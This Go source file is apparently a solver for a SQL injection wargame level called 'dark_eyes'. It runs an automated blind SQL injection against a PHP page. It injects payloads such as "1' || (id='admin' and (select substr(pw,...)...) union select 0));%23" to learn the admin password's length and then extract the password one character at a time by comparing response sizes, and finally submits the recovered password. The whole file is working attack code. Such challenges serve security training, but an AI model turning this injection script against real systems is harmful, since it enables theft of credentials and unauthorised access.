package problem

import(
	"fmt"
	"strings"
	"strconv"
)

func find_len8(file, session string) int{
	for length := 0 ; length < 100; length += 1 {
		s_pw := "1' || (id='admin' and (select LENGTH(pw) = " + strconv.Itoa(length) + " union select 0)); %23"
		param := map[string]string{
			"pw" : s_pw,
		}
		
		contents := connect(file, param, session)
		if len(string(contents)) < 10 {
			return length
		}
	}
	return 0
}

func find_pw8(file string, length int, session string)string{
	result := ""

	NEXT_STR:
	for i := 1 ; i <= length; i += 1 {
		url_str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		for j :=0 ; j< len(url_str); j += 1 {
			s_pw := "1' || (id='admin' and (select substr(pw,"+strconv.Itoa(i)+",1) <= '"+ string(url_str[j]) +"' union select 0));%23"
			param := map[string]string{
				"pw" : s_pw,
			}
			
			contents := connect(file, param, session)
			if len(string(contents)) < 10{
				result += string(url_str[j])
				continue NEXT_STR
			}
		}
	}
	return result
}


func Dark_eyes(session string){
	file := "dark_eyes_54dda5c7a8bff987a29bd6fc9b2aa729.php"
	
	length := find_len8(file, session)
	//fmt.Println("Key length is "+ strconv.Itoa(length) + ".")

	pw_str := find_pw8(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")
		
	param := map[string]string{
		"pw" : pw_str,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"DARK_EYES Clear!"){
		fmt.Println("DARK_EYES Clear!")
	}
}